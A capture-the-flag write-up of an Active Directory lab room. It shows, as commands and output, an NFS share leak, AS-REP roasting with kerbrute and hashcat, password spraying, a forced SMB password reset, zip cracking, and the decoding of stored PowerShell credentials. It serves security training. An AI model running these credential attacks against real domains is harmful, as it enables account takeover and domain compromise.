Raz0rBlack: an NFS leak into AS-REP roasting and a hex-encoded flag

An open NFS export hands over a staff spreadsheet, that becomes a username list for AS-REP roasting, a forced password reset turns read-only SMB access into a usable account, and a trail of encoded credentials leads from a zipped archive to the domain's final secret.

Room: Raz0rBlack Category: Active Directory Tools: Kerbrute, Hashcat, CrackMapExec, John

The setup: a Windows domain, raz0rblack.thm, with nothing handed over but an IP. The job: find a way to a valid username, turn that into credentials, and chain whatever's found into Administrator.

A literal flag does appear partway through these notes (a user's password happens to be formatted like one), omitted here, the technique to reach it is what matters.

The Investigation

Port 2049 is NFS, worth a direct look before touching anything AD-specific:

showmount -e 10.10.222.63
Export list for 10.10.222.63:
/users (everyone)

"everyone" means no credentials needed to mount it.

Why this works

An NFS export world-readable by "everyone" is the Linux-world equivalent of an open SMB share, easy to overlook on a Windows box since it's not the service you'd expect, but showmount -e costs nothing to try.

3
Turn the roster into a Kerberos foothold
./kerbrute -users /opt/userlist.txt -dc raz0rblack.thm -domain raz0rblack.thm -t 100

[*] Blocked/Disabled user => guest
[*] Valid user => administrator
[*] Valid user => twilliams [NOT PREAUTH]
[*] No passwords were discovered :'(

twilliams (Tyson Williams, from the roster) is flagged NOT PREAUTH, so a ticket can be requested with no password at all:

GetNPUsers.py raz0rblack.thm/twilliams
[*] Cannot authenticate twilliams, getting its TGT
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:33d761a84ed1974978f45ef42515928c$...a319be

Hashcat cracks it almost immediately:

hashcat -m 18200 TGT.hash -a 0 -w 3 /usr/share/wordlists/rockyou.txt --force

Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:33d761a84ed1...a319be:roastpotatoes
Why this works

Same AS-REP roasting pattern as any AD target: a disabled pre-auth flag means Kerberos hands over a crackable hash to anyone who asks, no password needed to request it.

4
Spray the cracked password, then force a reset

Trying roastpotatoes against another roster name, sbradley, authenticates but is locked behind a forced change:

crackmapexec smb 10.10.146.1 -u sbradley -p roastpotatoes
SMB  10.10.146.1  445  HAVEN-DC  [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE

smbpasswd can satisfy that requirement directly over SMB, using the known old password to set a new one:

smbpasswd -r 10.10.146.1 -U sbradley
Old SMB password: roastpotatoes
New SMB password: password12345678
Retype new SMB password: password12345678
Password changed for user sbradley

Confirming access with the new password turns up read access to shares, including a non-default one named trash:

smbmap -H 10.10.146.1 -u sbradley -p password12345678
Disk        Permissions   Comment
----        -----------   -------
ADMIN$      NO ACCESS     Remote Admin
C$          NO ACCESS     Default share
IPC$        READ ONLY     Remote IPC
NETLOGON    READ ONLY     Logon server share
SYSVOL      READ ONLY     Logon server share
trash       READ ONLY     Files Pending for deletion
Why this works

Password reuse across accounts is exactly what let a roasted service-account credential unlock a completely different user. STATUS_PASSWORD_MUST_CHANGE looks like a dead end, but SMB will happily let you satisfy that requirement yourself if you already know the old password.

5
Pull everything out of the trash share
smbclient -U sbradley //raz0rblack.thm/trash
smb: \> ls
  chat_log_20210222143423.txt
  experiment_gone_wrong.zip
  sbradley.txt

smbget -R smb://raz0rblack.thm/trash -U sbradley
Downloaded 18.05MB in 103 seconds

The zip is password-protected, but unzips enough to reveal what it's hiding before a password is even supplied:

unzip experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password:
  inflating: system.hive
  inflating: ntds.dit

A zip-cracking wordlist run recovers the archive password:

john wrong.hash -w=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (PKZIP [32/64])
electromagnetismo (experiment_gone_wrong.zip)
Session completed
Why this works

A share literally named "trash" that's still reachable is worth checking before anything else, deleted-but-not-gone is a recurring theme in misconfigured file shares. system.hive and ntds.dit together are the raw material for a full offline domain credential dump, exactly what a careless backup or cleanup script would leave behind.

6
Decode a stored credential inside a WinRM session

The notes pick back up already inside an Evil-WinRM session as lvetrova (the cracked zip password lines up with her account; the exact login command isn't in the captured screenshots, so it's not reproduced here rather than guessed at). Her profile has an exported PowerShell credential object sitting on the desktop:

*Evil-WinRM* PS C:\Users\lvetrova> dir

Mode     LastWriteTime        Length Name
----     -------------        ------ ----
-a----   2/25/2021 10:16 AM      1692 lvetrova.xml

A PSCredential exported with Export-Clixml can be decoded back to plaintext, but only by the same user account that exported it:

*Evil-WinRM* PS C:\Users\lvetrova> $credential=import-clixml -path ".\lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $credential.getnetworkcredential().password

That reveals lvetrova's real password (formatted like a flag in this room's notes, so not reprinted here).

Why this works

Export-Clixml encrypts a credential using Windows DPAPI, tied to the exporting user's own key. It isn't a secure way to store a password for anyone else, but it's completely reversible by that same account, exactly what Import-Clixml plus GetNetworkCredential() does here.

7
Find the same pattern in the Administrator's profile

A second exported credential, this one hex-encoded instead of the usual XML, turns up under the Administrator profile (again, the notes pick up already there, how access reached this directory isn't shown):

*Evil-WinRM* PS C:\users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f75206172652061207665...</SS>
    </Props>
  </Obj>
</Objs>

Pasting the hex string into CyberChef's "From Hex" recipe decodes it back to the Administrator's own stored secret.

Why this works

Same underlying weakness as the first credential, a human readable secret stored in a format that only looks obfuscated. Hex encoding isn't encryption, it's just a different alphabet, and CyberChef makes reversing it a drag-and-drop operation.

Full Attack Chain

nmap: raz0rblack.thm, NFS also open
  → showmount -e: /users exported to everyone
       → mount, pull employee_status.xlsx: staff roster + usernames
            → kerbrute: twilliams flagged NOT PREAUTH
                 → GetNPUsers.py + hashcat: twilliams' password cracked
                      → password reused against sbradley (forced change)
                           → smbpasswd resets it, smbmap finds a "trash" share
                                → trash share: a password-protected backup zip
                                     → john cracks the zip password
                                          → (gap in notes) WinRM session as lvetrova
                                               → Export-Clixml credential decoded
                                                    → (gap in notes) Administrator's profile
                                                         → hex-encoded credential decoded via CyberChef

Takeaways

An "everyone" NFS export is a credential leak waiting to happen

A simple staff spreadsheet, readable with zero authentication, became the username list that every later step depended on.

STATUS_PASSWORD_MUST_CHANGE is not a dead end

If the old password is already known, SMB lets an attacker satisfy the forced-change requirement themselves, turning a locked account into a usable one.

Exported credentials are only as safe as who can decode them

Both the XML and hex-encoded credentials found here were technically "protected," but trivially reversible once the right account (or the right CyberChef recipe) was in hand.
